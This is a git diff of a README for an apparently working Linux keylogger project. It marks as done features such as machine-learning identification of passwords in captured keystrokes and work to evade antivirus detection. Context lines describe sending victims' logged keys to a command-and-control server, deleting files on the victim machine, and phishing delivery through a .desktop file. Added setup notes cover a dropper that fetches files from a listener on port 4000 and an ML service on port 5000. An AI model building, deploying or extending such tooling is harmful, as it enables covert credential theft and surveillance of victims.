@@ -26,9 +26,9 @@ Here is a list of tasks for future development:
     - [x] Send keys logged for a victim;
     - [x] Delete files automatically on the victim computer after the files are sent;
     - [x] Receive bulk data and save it in files for every victim.
-- [ ] **Find a dataset to identify possible passwords in order to implement the ML-based algorithm;**
-- [ ] **Find current implementations for algorithms dedicated for password recognition from a text;**
-- [ ] **Evaluate the current keylogger level of exposure confronting with anti-virus solutions in Linux and further improve the solution to be harder to detect.**
+- [x] **Find a dataset to identify possible passwords in order to implement the ML-based algorithm;**
+- [x] **Find current implementations for algorithms dedicated for password recognition from a text;**
+- [x] **Evaluate the current keylogger level of exposure confronting with anti-virus solutions in Linux and further improve the solution to be harder to detect.**
 
 ---
 
@@ -75,9 +75,14 @@ A .desktop file can be used to deliver the keylogger via phishing attack.
 
 - Ensure you have the necessary permissions to run the keylogger on the target machine (as Linux requires root authority to capture keys pressed);
 - You can modify the code to suit specific requirements or perform further actions with the captured data.
+- A directory listener has to run on port 4000 in _Resurse_ folder in order to be able the dropper to retrieve the needed files.
+- The ML algorithm can be started using the following command after installing the dependencies (it will open the port 5000):
+```
+python .\app.py
+```
 ---
 
 ## Future Directions
 
 - [x] Implement communication with a central server (C2) for real-time data transfer.
-- [ ] Use machine learning algorithms to analyze the captured data for potential password identification.
+- [x] Use machine learning algorithms to analyze the captured data for potential password identification.
